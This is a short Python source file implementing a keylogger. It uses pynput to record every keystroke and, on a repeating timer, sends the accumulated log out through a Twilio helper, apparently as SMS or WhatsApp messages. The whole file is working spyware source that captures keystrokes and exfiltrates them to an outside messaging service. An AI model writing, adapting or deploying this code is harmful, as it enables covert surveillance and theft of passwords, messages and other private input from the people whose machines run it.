#!/usr/bin/env python

import pynput.keyboard
import threading
from TwilioInstance import TwilioInstance

class KeyLogger:
    def __init__(self, time_interval):
        self.log = "Keylogger started, logging keystrokes...\n"
        self.interval = time_interval
        self.twilio_instance = TwilioInstance()

    def append_to_log(self, string):
        self.log = self.log + string

    def key_press_listener(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            else:
                current_key = " " + str(key) + " "
        print(self.log)
        self.append_to_log(current_key)

    def report(self):
        self.twilio_instance.send_sms_whatsapp(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.key_press_listener)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
